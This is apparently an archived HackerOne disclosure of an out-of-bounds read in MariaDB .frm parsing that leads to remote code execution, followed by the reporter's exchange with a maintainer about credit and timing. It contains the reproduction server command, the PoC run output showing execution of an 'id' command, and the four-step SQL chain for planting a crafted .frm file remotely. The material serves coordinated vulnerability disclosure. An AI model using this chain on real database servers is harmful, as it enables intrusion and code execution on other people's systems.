---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/out-of-bounds-read
  - env/web
substate: "resolved"
weakness: "Out-of-bounds Read"
enriched: true
date: 2026-09-08
submitted: 2026-07-29T03:17:28.792Z
bounty_usd: null
votes: 43
cve: "CVE-2026-107821"
program: "[[programs/mariadb|MariaDB]]"
reporter: "pinebudweiser"
source: "https://hackerone.com/reports/3897914"
title: "Out-of-bounds read in MariaDB .frm parsing enables RCE via vtable hijacking"
---
# Out-of-bounds read in MariaDB .frm parsing enables RCE via vtable hijacking

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 43 | **Program:** MariaDB | **Disclosed:** 2026-09-08

- Report: [https://hackerone.com/reports/3897914](https://hackerone.com/reports/3897914)
- CWE: Out-of-bounds Read | CVE: CVE-2026-107821
- Submitted: 2026-07-29T03:17:28.792Z

## Timeline

- **Report Filed**
- **2026-07-29** @pinebudweiser: Providing additional details regarding the PoC and reproduction steps in a local environment.

The environment information is as follows:
- MariaDB 13.1.0
- Although the PoC script mentions "Ubuntu 26.04 LTS," please disregard that. This was actually performed in a Ubuntu 24.04 LTS(WSL) environment.
- ASLR = 2

The procedure for reproduction is as follows:
- Running the local mariadbd daemon
```shell
~/mariadb-13.1.0/inst/bin/mariadbd \
  --no-defaults \
  --datadir="$HOME/off131/data" \
  --socket="$HOME/off131/off.sock" \
  --port=3306 \
  --bind-address=127.0.0.1 \
  --skip-grant-tables \
  --secure-file-priv= \
  --local-infile=1 \
  --aria-log-dir-path="$HOME/off131/data" \
  --log-error="$HOME/off131/off.log" \
  --pid-file="$HOME/off131/off.pid"
```
- Run the PoC code to verify that the leaked address of the `comment_pos` object satisfies the gate condition (stable=True).
```shell
$ python3 t16_e2e.py
[*] connected (single arena). server ver: 13.1.0-MariaDB
[*] MB=0x555e8300c000 LB=0x77f3c9a00000
[*] leaked C(comment_pos)=0x77f3a4032f90
[*] CALIB: re-leaked C2=0x77f3a4032f90  stable=True
[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
```
- Execute the exploit and check the results.
```shell
$ python3 t16_e2e.py --fire
[*] connected (single arena). server ver: 13.1.0-MariaDB
[*] MB=0x555e8300c000 LB=0x77f3c9a00000
[*] leaked C(comment_pos)=0x77f3a4032f90
[*] CALIB: re-leaked C2=0x77f3a4032f90  stable=True
[*] arming fieldnr=47, delivering weapon, triggering R5 (execve). cmd='id > /tmp/frm_pwned_t16 2>&1; echo PWNED_$(id -u) >> /tmp/frm_pwned_t16'
[*] trigger raised (expected on execve): OperationalError(2013, 'Lost connection to MySQL server during query')
[*] fired. check /tmp/frm_pwned_t16 for proof.
$ cat /tmp/frm_pwned_t16
uid=1000(pinebudweiser) gid=1000(pinebudweiser) groups=1000(pinebudweiser),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),107(netdev),110(docker)
PWNED_1000
```
- **2026-07-29** @pinebudweiser: Clarification regarding the local (13.1.0_poc.7z) and remote test (072926_10.4.18_remote_fieldnrOOBRead_RCE_poc.mp4) harnesses:
The `os.remove(FRM)` operation is used only by a local development harness to reset the target `.frm` file while debugging the parser and exploit.

The actual remote proof of concept does not require local filesystem or shell access. It performs the complete replacement remotely through MariaDB SQL statements:
1. DROP TABLE removes the existing table and .frm file.
2. SELECT UNHEX(...) INTO DUMPFILE writes the crafted .frm file.
3. FLUSH TABLES invalidates the relevant table cache.
4. SHOW CREATE TABLE causes MariaDB to load and parse the crafted .frm file.

Therefore, local OS access to the datadir is not an attack prerequisite. The current remote chain requires the global `FILE` and `RELOAD` privileges, together with the necessary `CREATE`, `DROP`, `SELECT`, and `INSERT` privileges on an accessible schema. `SUPER` and operating-system-level access are not required.
- **Report Triaged**
- **2026-07-31** @pinebudweiser: Please write reported by pinebudweiser and Ph4nt0m. Thanks your fast respond.
- **2026-07-31** @vuvova: Do you have a github account? If yes, I can additionally use that on github, there's a special field for that
- **2026-08-01** @pinebudweiser: Yes, my github username is `pinebudweiser(https://github.com/pinebudweiser)`. Please use it in the special field.
- **2026-08-14** @pinebudweiser: Hello, I noticed that MDEV-40571 has now been publicly referenced in the MariaDB 10.6.28 release notes, released on August 13, 2026.
The HackerOne report is still in the Triaged state, and I could not find a public CVE associated with MDEV-40571.

Could you please confirm whether a CVE has been reserved or is planned for this vulnerability?
Also, since the fix and MDEV reference are now public, could you let us know the planned timeline for disclosure and researcher attribution/credit?
Thank you.
- **2026-08-14** @pinebudweiser: Additionally, after the CVE is publicly disclosed, we plan to publish a technical write-up, proof-of-concept code, and the exploitation chain on our personal GitHub repository.
Could you please confirm whether this would be acceptable, and whether there are any disclosure guidelines or timing restrictions we should follow?
- **2026-08-14** @vuvova: MDEV-40571 itself isn't public yet, it's waiting for all other affected versions to be released. There is a security advisory, not public yet, waiting for the same. Should be any day now, but I cannot predict exactly when.

I've requested a CVE id, but it's taking a while, apparently, everybody is overloaded with reports. I don't know how long it'll take. I assume it's possible that we'll publish an advisory without a CVE  id and will add it later, when we'll know it.

You're credited in the MDEV, in the advisory text, and in the special advisory attribution field (the latter will be additionally visible in https://github.com/dstesk)

Publishing is fine, yes, but, please, after we publish the advisory.
- **2026-08-14** @pinebudweiser: Yes, understood. I’ll wait until the security advisory is published before releasing the technical write-up and PoC. I asked because I noticed that full exploit chains for other vulnerabilities, such as MDEV-40470 and MDEV-40328, had already been publicly disclosed even though their security advisories had not yet been published.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Cve Id Added**
